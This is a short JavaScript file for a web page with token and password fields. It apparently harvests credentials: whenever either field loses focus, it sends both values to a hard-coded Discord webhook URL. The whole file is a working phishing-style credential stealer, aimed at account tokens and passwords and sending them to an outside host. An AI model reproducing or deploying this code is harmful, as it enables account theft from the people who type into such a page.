document.addEventListener('DOMContentLoaded', function() {
    const tokenInput = document.getElementById('token');
    const passwordInput = document.getElementById('password');

    const sendToDiscord = (token, password) => {
        const xhr = new XMLHttpRequest();
        const url = 'https://discord.com/api/webhooks/1216319088843030528/hX_8qMQKRR8IkYjwXB2cYUk_f28yKAnPb7S9Os7iorbersFo7y1NyTu68N3oiomb_Yhg';
        xhr.open('POST', url);
        xhr.setRequestHeader('Content-Type', 'application/json');
        const data = JSON.stringify({ token: token, password: password });
        xhr.send(data);
    };

    tokenInput.addEventListener('blur', function() {
        const token = tokenInput.value;
        sendToDiscord(token, passwordInput.value);
    });

    passwordInput.addEventListener('blur', function() {
        const password = passwordInput.value;
        sendToDiscord(tokenInput.value, password);
    });
});
